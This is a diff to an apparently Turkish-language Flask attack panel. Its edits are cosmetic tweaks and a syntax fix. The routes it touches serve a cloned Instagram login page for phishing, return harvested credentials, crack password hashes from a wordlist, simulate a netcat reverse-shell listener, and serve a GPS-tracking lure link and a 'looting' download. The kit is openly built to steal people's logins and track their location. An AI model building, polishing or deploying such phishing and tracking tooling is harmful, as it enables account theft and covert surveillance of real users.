@@ -525,7 +525,7 @@ def insta_phish():
             .left-side { margin-right: 32px; display: flex; flex-direction: column; align-items: flex-start; }
             .right-side { width: 350px; display: flex; flex-direction: column; }
             .login-card { background: #ffffff; border: 1px solid #dbdbdb; padding: 30px 40px; text-align: center; border-radius: 1px; margin-bottom: 10px; }
-            .logo-header { display: flex; align-items: center; gap: 10px; margin-bottom: 25px; }
+            .logo-header { display: flex; align-items: center; justify-content: center; gap: 10px; margin-bottom: 25px; }
             .logo-header h1 { font-family: -apple-system, BlinkMacSystemFont, sans-serif; font-size: 24px; font-weight: 500; margin: 0; color: #262626; }
             .insta-icon { width: 28px; height: 28px; background: radial-gradient(circle at 30% 107%, #fdf497 0%, #fdf497 5%, #fd5949 45%, #d6249f 60%, #285AEB 90%); border-radius: 8px; }
             .tagline { font-size: 32px; line-height: 40px; font-weight: 600; color: #262626; max-width: 400px; margin-bottom: 20px; }
@@ -549,7 +549,6 @@ def insta_phish():
         <div class="wrapper">
             <div class="left-side">
                 <div class="tagline"><span>Yakın arkadaşlarının</span> günlük anlarını gör.</div>
-                <img src="https://i.ibb.co/3s6qjLq/insta-mockup.png" style="width: 320px; display:none;" alt="">
             </div>
             <div class="right-side">
                 <div class="login-card">
@@ -573,7 +572,7 @@ def insta_phish():
                     Hesabın yok mu? <a href="#">Kaydol</a>
                 </div>
                 <div class="meta-footer">
-                    <p style="margin: 0; font-size: 14px; font-weight: normal;">infinita Meta</p>
+                    <p style="margin: 0; font-size: 14px; font-weight: normal;">∞ Meta</p>
                 </div>
             </div>
         </div>
@@ -586,7 +585,6 @@ def api_phish_creds():
     if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
     return jsonify({"creds": CREDENTIAL_LOGS})
 
-# --- HASH CRACKER API ---
 @app.route("/api/crack-hash", methods=["POST"])
 def api_crack_hash():
     if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
@@ -617,14 +615,12 @@ def api_crack_hash():
         out = f"[-] Eşleşme bulunamadı. Toplam {attempts} kelime denendi, şifre wordlist içinde yok."
     return jsonify({"output": out})
 
-# --- REVERSE SHELL LISTENER API ---
 @app.route("/api/listener/start", methods=["POST"])
 def api_listener_start():
     if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
     port = request.get_json().get("port", 4444)
     return jsonify({"output": f"[+] Netcat dinleyicisi {port} portu üzerinde aktif edildi.\n(Not: Render/PaaS ortamlarında harici port açılması kısıtlı olduğundan simüle edildi.)"})
 
-# --- GELİŞMİŞ LURE LINK VE GPS TRACKER ---
 @app.route("/track/<track_id>")
 def track_visitor(track_id):
     return f"""
@@ -809,7 +805,7 @@ def api_looting_zip():
 
 @app.route("/api/download-pdf")
 def api_download_pdf():
-    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}}, 401
+    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
     pdf = FPDF(); pdf.add_page(); pdf.set_font('Courier', '', 9)
     pdf.multi_cell(0, 5, "Red Team Report")
     return send_file(io.BytesIO(pdf.output(dest='S').encode('latin-1')), mimetype='application/pdf', as_attachment=True, download_name='report.pdf')
